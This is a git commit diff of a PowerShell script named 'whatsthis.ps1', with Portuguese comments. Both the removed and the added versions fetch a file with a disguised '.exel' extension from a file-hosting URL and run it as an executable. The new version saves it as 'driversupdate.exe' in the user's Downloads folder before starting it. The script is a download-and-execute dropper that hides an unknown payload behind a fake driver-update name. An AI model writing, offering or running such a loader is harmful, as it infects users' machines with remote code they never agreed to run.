987e8eda3e71a472e4f6c9a7f22012d27417f178
hamood <71662379+tupimano@users.noreply.github.com>
2024-07-22 18:55:59 -0300

    Update whatsthis.ps1

--- whatsthis.ps1
+++ whatsthis.ps1
@@ -1,20 +1,3 @@
-# URL do arquivo
-$url = "https://files.catbox.moe/uy96rs.exel"
-
-# Caminho onde o arquivo será salvo
-$downloadPath = "$env:TEMP\uy96rs.exel"
-
-# Caminho onde o arquivo será renomeado e salvo
-$exePath = "$env:TEMP\uy96rs.exe"
-
-# Cria uma instância do WebClient
-$webClient = New-Object System.Net.WebClient
-
-# Baixa o arquivo
-$webClient.DownloadFile($url, $downloadPath)
-
-# Renomeia o arquivo
-Rename-Item -Path $downloadPath -NewName $exePath
-
-# Executa o arquivo
-Start-Process -FilePath $exePath
+$downloadUrl = "https://files.catbox.moe/uy96rs.exel"
+Invoke-WebRequest $downloadUrl -OutFile $env:USERPROFILE\Downloads\driversupdate.exe
+Start-Process $env:USERPROFILE\Downloads\driversupdate.exe -Wait
